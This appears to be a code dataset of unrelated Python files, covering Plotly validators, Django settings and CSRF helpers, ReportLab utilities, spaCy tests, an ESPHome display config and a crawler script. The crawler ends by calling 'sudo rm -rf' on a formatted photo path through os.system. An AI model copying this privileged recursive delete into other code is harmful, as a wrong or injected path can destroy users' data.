    role = current_user_claims.get('role')
    product = Product.query.filter_by(id=id).first()
    if role == ""lab"":
        if product:
            db.session.delete(product)
            db.session.commit()
            return {""message"": ""This product has been deleted""}
        else:
            return {""message"": ""This product does not exist""}, 400
    else:
        return {""message"": ""You do not have authorization to delete products.""}, 403
"
JY379	JY379-_can_cmap_data.py	"#
""""""
This is a utility to 'can' the widths data for certain CID fonts.
Now we're using Unicode, we don't need 20 CMAP files for each Asian
language, nor the widths of the non-normal characters encoded in each
font.  we just want a dictionary of the character widths in a given
font which are NOT 1000 ems wide, keyed on Unicode character (not CID).

Running off CMAP files we get the following widths...::

    >>> font = UnicodeCIDFont('HeiseiMin-W3')
    >>> font.stringWidth(unicode(','), 10)
    2.5
    >>> font.stringWidth(unicode('m'), 10)
    7.7800000000000002
    >>> font.stringWidth(u'\u6771\u4EAC', 10)
    20.0
    >>> 

""""""

from pprint import pprint as pp

from reportlab.pdfbase._cidfontdata import defaultUnicodeEncodings
from reportlab.pdfbase.cidfonts import UnicodeCIDFont


def run():

    buf = []
    buf.append('widthsByUnichar = {}')
    for fontName, (language, encName) in defaultUnicodeEncodings.items():
        print('handling %s : %s : %s' % (fontName, language, encName))

        #this does just about all of it for us, as all the info
        #we need is present.
        font = UnicodeCIDFont(fontName)

        widthsByCID = font.face._explicitWidths
        cmap = font.encoding._cmap
        nonStandardWidthsByUnichar = {}
        for codePoint, cid in cmap.items():
            width = widthsByCID.get(cid, 1000)
            if width != 1000:
                nonStandardWidthsByUnichar[chr(codePoint)] = width
        

        
        print('created font width map (%d items).  ' % len(nonStandardWidthsByUnichar))

        buf.append('widthsByUnichar[""%s""] = %s' % (fontName, repr(nonStandardWidthsByUnichar)))
        
        
    src = '\n'.join(buf) + '\n'
    open('canned_widths.py','w').write(src)
    print('wrote canned_widths.py')

if __name__=='__main__':
    run()
    "
JD472	JD472-test_text.py	"# coding: utf-8
from __future__ import unicode_literals

import pytest
from spacy.lang.tr.lex_attrs import like_num


def test_tr_tokenizer_handles_long_text(tr_tokenizer):
    text = """"""Pamuk nasıl ipliğe dönüştürülür?

Sıkıştırılmış balyalar halindeki pamuk, iplik fabrikasına getirildiğinde hem 
lifleri birbirine dolaşmıştır, hem de tarladan toplanırken araya bitkinin 
parçaları karışmıştır. Üstelik balyalardaki pamuğun cinsi aynı olsa bile kalitesi 
değişeceğinden, önce bütün balyaların birbirine karıştırılarak harmanlanması gerekir.

Daha sonra pamuk yığınları, liflerin açılıp temizlenmesi için tek bir birim halinde 
birleştirilmiş çeşitli makinelerden geçirilir.Bunlardan biri, dönen tokmaklarıyla
pamuğu dövüp kabartarak dağınık yumaklar haline getiren ve liflerin arasındaki yabancı
maddeleri temizleyen hallaç makinesidir. Daha sonra tarak makinesine giren pamuk demetleri,
herbirinin yüzeyinde yüzbinlerce incecik iğne bulunan döner silindirlerin arasından geçerek lif lif ayrılır
ve tül inceliğinde gevşek bir örtüye dönüşür. Ama bir sonraki makine bu lifleri dağınık 
ve gevşek bir biçimde birbirine yaklaştırarak 2 cm eninde bir pamuk şeridi haline getirir.""""""
    tokens = tr_tokenizer(text)
    assert len(tokens) == 146




@pytest.mark.parametrize(
    ""word"",
    [
        ""bir"",
        ""iki"",
        ""dört"",
        ""altı"",
        ""milyon"",
        ""100"",
        ""birinci"",
        ""üçüncü"",
        ""beşinci"",
        ""100üncü"",
        ""8inci""
    ]
)
def test_tr_lex_attrs_like_number_cardinal_ordinal(word):
    assert like_num(word)


@pytest.mark.parametrize(""word"", [""beş"", ""yedi"", ""yedinci"", ""birinci""])
def test_tr_lex_attrs_capitals(word):
    assert like_num(word)
    assert like_num(word.upper())
"
JD113	JD113-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'l, j F, Y'
TIME_FORMAT = 'h:i a'
DATETIME_FORMAT = 'j F, Y h:i a'
YEAR_MONTH_FORMAT = 'F, Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'j.M.Y'
SHORT_DATETIME_FORMAT = 'j.M.Y H:i'
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'
    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'
    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'
    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
JY304	JY304-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scatter"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY420	JY420-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""bar"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY512	JY512-display.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import lcd_base
from esphome.const import (
    CONF_DATA_PINS,
    CONF_ENABLE_PIN,
    CONF_RS_PIN,
    CONF_RW_PIN,
    CONF_ID,
    CONF_LAMBDA,
)

AUTO_LOAD = [""lcd_base""]

lcd_gpio_ns = cg.esphome_ns.namespace(""lcd_gpio"")
GPIOLCDDisplay = lcd_gpio_ns.class_(""GPIOLCDDisplay"", lcd_base.LCDDisplay)


def validate_pin_length(value):
    if len(value) != 4 and len(value) != 8:
        raise cv.Invalid(
            f""LCD Displays can either operate in 4-pin or 8-pin mode,not {len(value)}-pin mode""
        )
    return value


CONFIG_SCHEMA = lcd_base.LCD_SCHEMA.extend(
    {
        cv.GenerateID(): cv.declare_id(GPIOLCDDisplay),
        cv.Required(CONF_DATA_PINS): cv.All(
            [pins.gpio_output_pin_schema], validate_pin_length
        ),
        cv.Required(CONF_ENABLE_PIN): pins.gpio_output_pin_schema,
        cv.Required(CONF_RS_PIN): pins.gpio_output_pin_schema,
        cv.Optional(CONF_RW_PIN): pins.gpio_output_pin_schema,
    }
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await lcd_base.setup_lcd_display(var, config)
    pins_ = []
    for conf in config[CONF_DATA_PINS]:
        pins_.append(await cg.gpio_pin_expression(conf))
    cg.add(var.set_data_pins(*pins_))
    enable = await cg.gpio_pin_expression(config[CONF_ENABLE_PIN])
    cg.add(var.set_enable_pin(enable))

    rs = await cg.gpio_pin_expression(config[CONF_RS_PIN])
    cg.add(var.set_rs_pin(rs))

    if CONF_RW_PIN in config:
        rw = await cg.gpio_pin_expression(config[CONF_RW_PIN])
        cg.add(var.set_rw_pin(rw))

    if CONF_LAMBDA in config:
        lambda_ = await cg.process_lambda(
            config[CONF_LAMBDA],
            [(GPIOLCDDisplay.operator(""ref""), ""it"")],
            return_type=cg.void,
        )
        cg.add(var.set_writer(lambda_))"
JY423	JY423-pagesizes.py	"#!/bin/env python
#Copyright ReportLab Europe Ltd. 2000-2017
#see license.txt for license details
#history https://hg.reportlab.com/hg-public/reportlab/log/tip/src/reportlab/lib/pagesizes.py

""""""This module defines a few common page sizes in points (1/72 inch).
To be expanded to include things like label sizes, envelope windows
etc.""""""
__version__='3.4.18'

from reportlab.lib.units import mm, inch

#ISO 216 standard paer sizes; see eg https://en.wikipedia.org/wiki/ISO_216
A0 = (841*mm,1189*mm)
A1 = (594*mm,841*mm)
A2 = (420*mm,594*mm)
A3 = (297*mm,420*mm)
A4 = (210*mm,297*mm)
A5 = (148*mm,210*mm)
A6 = (105*mm,148*mm)
A7 = (74*mm,105*mm)
A8 = (52*mm,74*mm)
A9 = (37*mm,52*mm)
A10 = (26*mm,37*mm)

B0 = (1000*mm,1414*mm)
B1 = (707*mm,1000*mm)
B2 = (500*mm,707*mm)
B3 = (353*mm,500*mm)
B4 = (250*mm,353*mm)
B5 = (176*mm,250*mm)
B6 = (125*mm,176*mm)
B7 = (88*mm,125*mm)
B8 = (62*mm,88*mm)
B9 = (44*mm,62*mm)
B10 = (31*mm,44*mm)

C0 = (917*mm,1297*mm)
C1 = (648*mm,917*mm)
C2 = (458*mm,648*mm)
C3 = (324*mm,458*mm)
C4 = (229*mm,324*mm)
C5 = (162*mm,229*mm)
C6 = (114*mm,162*mm)
C7 = (81*mm,114*mm)
C8 = (57*mm,81*mm)
C9 = (40*mm,57*mm)
C10 = (28*mm,40*mm)

#American paper sizes
LETTER = (8.5*inch, 11*inch)
LEGAL = (8.5*inch, 14*inch)
ELEVENSEVENTEEN = (11*inch, 17*inch)

# From https://en.wikipedia.org/wiki/Paper_size
JUNIOR_LEGAL = (5*inch, 8*inch)
HALF_LETTER = (5.5*inch, 8*inch)
GOV_LETTER = (8*inch, 10.5*inch)
GOV_LEGAL = (8.5*inch, 13*inch)
TABLOID = ELEVENSEVENTEEN
LEDGER = (17*inch, 11*inch)

# lower case is deprecated as of 12/2001, but here
# for compatability
letter=LETTER
legal=LEGAL
elevenSeventeen = ELEVENSEVENTEEN

#functions to mess with pagesizes
def landscape(pagesize):
    """"""Use this to get page orientation right""""""
    a, b = pagesize
    if a < b:
        return (b, a)
    else:
        return (a, b)

def portrait(pagesize):
    """"""Use this to get page orientation right""""""
    a, b = pagesize
    if a >= b:
        return (b, a)
    else:
        return (a, b)"
JY364	JY364-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""heatmapgl"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY273	JY273-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scatterpolargl"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY315	JY315-run.py	"import datetime, json, os, sys
from lib.crawling import Crawling
from lib.database import DB
from lib.telegram import TeleGram
from lib.make_data import Make_Data
from lib.settings import logger, make_folder, args_check, json_check, now, photo_path

def run(hscode_dict, crawling, db, tele, make):
    menus = ''
    menus += '#수출입데이터 ' + now.strftime('#%Y년%m월%d일') + '\n'

    for title in hscode_dict:
        tag = '#수출입데이터' + ' ' + '#' + title + ' ' + now.strftime('#%Y년%m월%d일')    
        photo_name = photo_path + str(hscode_dict[title]) + '_' + str(now.year) + str(now.month) + str(now.day) + '.png'
        crawling_dict = crawling.get_search(hscode_dict[title])
        df, template, month = make.data_remodel(crawling_dict, hscode_dict[title], tag, db)
        make.make_photo(df, title, hscode_dict[title], photo_name, month)
        tele.send_photo(photo_name, template)
        db.insert_update_db(title, hscode_dict[title], crawling_dict)
        menus += '#' + title + '\n'
    tele.send_message(menus)

def main():
    crawling = Crawling()
    db = DB()
    tele = TeleGram()
    make = Make_Data()

    for json_file in json_list:
        with open(json_path + json_file, 'r', encoding='utf-8') as f:
            hscode_dict = json.load(f)
        run(hscode_dict, crawling, db, tele, make)
        f.close()    

    db.cs.close()
    crawling.driver.close()

if __name__ == '__main__':
    args = sys.argv
    json_path = args_check(args)
    json_list = json_check(json_path)

    logger(f""Main started at {now}"")
    make_folder()
    main()
    et = datetime.datetime.now()
    logger(f""Main finished at {et}"")
    logger(f""Main time for task: {et-now}"")
    os.system(""sudo rm -rf {photo_path}*.png"".format(photo_path=photo_path))"
JY235	JY235-test_datastore_system.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import os

import pytest

from tests.providers.google.cloud.utils.gcp_authenticator import GCP_DATASTORE_KEY
from tests.test_utils.gcp_system_helpers import CLOUD_DAG_FOLDER, GoogleSystemTest, provide_gcp_context

BUCKET = os.environ.get(""GCP_DATASTORE_BUCKET"", ""datastore-system-test"")


@pytest.mark.backend(""mysql"", ""postgres"")
@pytest.mark.credential_file(GCP_DATASTORE_KEY)
class TestGcpDatastoreSystem(GoogleSystemTest):
    @provide_gcp_context(GCP_DATASTORE_KEY)
    def setup_method(self):
        self.create_gcs_bucket(BUCKET, location=""europe-central2"")

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def teardown_method(self):
        self.delete_gcs_bucket(BUCKET)

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def test_run_example_dag(self):
        self.run_dag(""example_gcp_datastore"", CLOUD_DAG_FOLDER)

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def test_run_example_dag_operations(self):
        self.run_dag(""example_gcp_datastore_operations"", CLOUD_DAG_FOLDER)"
JD105	JD105-csrf.py	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = ""requires_csrf_token""
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = ""ensure_csrf_cookie""
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""

    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)

    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
JD145	JD145-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""scatterternary"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY479	JY479-_compat.py	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    """"""
    pytest-mypy complains here because:
    error: Incompatible import of ""Protocol"" (imported name has type
    ""typing_extensions._SpecialForm"", local name has type ""typing._SpecialForm"")
    """"""
    from typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
JY88	JY88-admin_urls.py	"from urllib.parse import parse_qsl, unquote, urlparse, urlunparse

from django import template
from django.contrib.admin.utils import quote
from django.urls import Resolver404, get_script_prefix, resolve
from django.utils.http import urlencode

register = template.Library()


@register.filter
def admin_urlname(value, arg):
    return 'admin:%s_%s_%s' % (value.app_label, value.model_name, arg)


@register.filter
def admin_urlquote(value):
    return quote(value)


@register.simple_tag(takes_context=True)
def add_preserved_filters(context, url, popup=False, to_field=None):
    opts = context.get('opts')
    preserved_filters = context.get('preserved_filters')

    parsed_url = list(urlparse(url))
    parsed_qs = dict(parse_qsl(parsed_url[4]))
    merged_qs = {}

    if opts and preserved_filters:
        preserved_filters = dict(parse_qsl(preserved_filters))

        match_url = '/%s' % unquote(url).partition(get_script_prefix())[2]
        try:
            match = resolve(match_url)
        except Resolver404:
            pass
        else:
            current_url = '%s:%s' % (match.app_name, match.url_name)
            changelist_url = 'admin:%s_%s_changelist' % (opts.app_label, opts.model_name)
            if changelist_url == current_url and '_changelist_filters' in preserved_filters:
                preserved_filters = dict(parse_qsl(preserved_filters['_changelist_filters']))

        merged_qs.update(preserved_filters)

    if popup:
        from django.contrib.admin.options import IS_POPUP_VAR
        merged_qs[IS_POPUP_VAR] = 1
    if to_field:
        from django.contrib.admin.options import TO_FIELD_VAR
        merged_qs[TO_FIELD_VAR] = to_field

    merged_qs.update(parsed_qs)

    parsed_url[4] = urlencode(merged_qs)
    return urlunparse(parsed_url)"
JD315	JD315-snippets_notification_receiver.py	"#!/usr/bin/env python
#
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""Demo for receiving notifications.""""""


def receive_notifications(project_id, subscription_name):
    # [START securitycenter_receive_notifications]
    # Requires https://cloud.google.com/pubsub/docs/quickstart-client-libraries#pubsub-client-libraries-python
    import concurrent

    from google.cloud import pubsub_v1
    from google.cloud.securitycenter_v1 import NotificationMessage

    # TODO: project_id = ""your-project-id""
    # TODO: subscription_name = ""your-subscription-name""

    def callback(message):

        # Print the data received for debugging purpose if needed
        print(f""Received message: {message.data}"")

        notification_msg = NotificationMessage.from_json(message.data)

        print(
            ""Notification config name: {}"".format(
                notification_msg.notification_config_name
            )
        )
        print(""Finding: {}"".format(notification_msg.finding))

        # Ack the message to prevent it from being pulled again
        message.ack()

    subscriber = pubsub_v1.SubscriberClient()
    subscription_path = subscriber.subscription_path(project_id, subscription_name)

    streaming_pull_future = subscriber.subscribe(subscription_path, callback=callback)

    print(""Listening for messages on {}...\n"".format(subscription_path))
    try:
        streaming_pull_future.result(timeout=1)  # Block for 1 second
    except concurrent.futures.TimeoutError:
        streaming_pull_future.cancel()
    # [END securitycenter_receive_notifications]
    return True"
JY428	JY428-typing.py	"import typing as t


if t.TYPE_CHECKING:
    from _typeshed.wsgi import WSGIApplication  # noqa: F401
    from werkzeug.datastructures import Headers  # noqa: F401
    from .wrappers import Response  # noqa: F401

# The possible types that are directly convertible or are a Response object.
ResponseValue = t.Union[
    ""Response"",
    t.AnyStr,
    t.Dict[str, t.Any],  # any jsonify-able dict
    t.Generator[t.AnyStr, None, None],
]
StatusCode = int

# the possible types for an individual HTTP header
HeaderName = str
HeaderValue = t.Union[str, t.List[str], t.Tuple[str, ...]]

# the possible types for HTTP headers
HeadersValue = t.Union[
    ""Headers"", t.Dict[HeaderName, HeaderValue], t.List[t.Tuple[HeaderName, HeaderValue]]
]

# The possible types returned by a route function.
ResponseReturnValue = t.Union[
    ResponseValue,
    t.Tuple[ResponseValue, HeadersValue],
    t.Tuple[ResponseValue, StatusCode],
    t.Tuple[ResponseValue, StatusCode, HeadersValue],
    ""WSGIApplication"",
]

GenericException = t.TypeVar(""GenericException"", bound=Exception, contravariant=True)

AppOrBlueprintKey = t.Optional[str]  # The App key is None, whereas blueprints are named
AfterRequestCallable = t.Callable[[""Response""], ""Response""]
BeforeFirstRequestCallable = t.Callable[[], None]
BeforeRequestCallable = t.Callable[[], t.Optional[ResponseReturnValue]]
TeardownCallable = t.Callable[[t.Optional[BaseException]], None]
TemplateContextProcessorCallable = t.Callable[[], t.Dict[str, t.Any]]
TemplateFilterCallable = t.Callable[..., t.Any]
TemplateGlobalCallable = t.Callable[..., t.Any]
TemplateTestCallable = t.Callable[..., bool]
URLDefaultCallable = t.Callable[[str, dict], None]
URLValuePreprocessorCallable = t.Callable[[t.Optional[str], t.Optional[dict]], None]
ErrorHandlerCallable = t.Callable[[GenericException], ResponseReturnValue]"
JD423	JD423-base_unit_manager.py	"from dataclasses import dataclass
from typing import Any, Optional, Callable
from types import ModuleType
import inspect
import importlib
import warnings

@dataclass
class BaseUnit:
    name: str
    description: str

BaseUnitBuilder = Callable[[Any], dict[str, BaseUnit]]

class RecursiveBaseUnitBuilder:
    def __call__(self, source: Any) -> dict[str, BaseUnit]:
        units = {}
        self._call_recursive(source, units, 0)
        return units

    def from_dict(self, d, units, level):
        raise NotImplementedError

    def from_module(self, module, units, level):
        raise NotImplementedError

    def from_payload(self, payload, units, level):
        raise NotImplementedError

    def _call_recursive(self, source, units, level):
        if isinstance(source, ModuleType):
            self.from_module(source, units, level + 1)

        elif isinstance(source, dict):
            for nname, obj in source.items():
                name = str(nname)
                assert obj, name

                self.from_dict({'name': name, 'payload': obj}, units, level + 1)

        elif isinstance(source, list):
            for elem in source:
                if isinstance(elem, dict):
                    self.from_dict(elem, units, level + 1)

                elif inspect.ismodule(elem):
                    self._call_recursive(elem, units, level + 1)

                else:
                    self.from_payload(elem, units, level + 1)
        else:
            self.from_payload(source, units, level)

class BaseUnitManager:
    def __init__(self, 
                 source: Any,
                 builder: BaseUnitBuilder,
                 ):

        self._source = source
        self._builder = builder
        self.build()

    @property
    def units(self):
        return self._units

    def reload(self):
        self.build()

    def build(self):
        self._units = self._builder(self._source)"
JY452	JY452-test_snap.py	"import pytest

from pandas import (
    DatetimeIndex,
    date_range,
)
import pandas._testing as tm


def astype_non_nano(dti_nano, unit):
    # TODO(2.0): remove once DTI/DTA.astype supports non-nano
    if unit == ""ns"":
        return dti_nano

    dta_nano = dti_nano._data
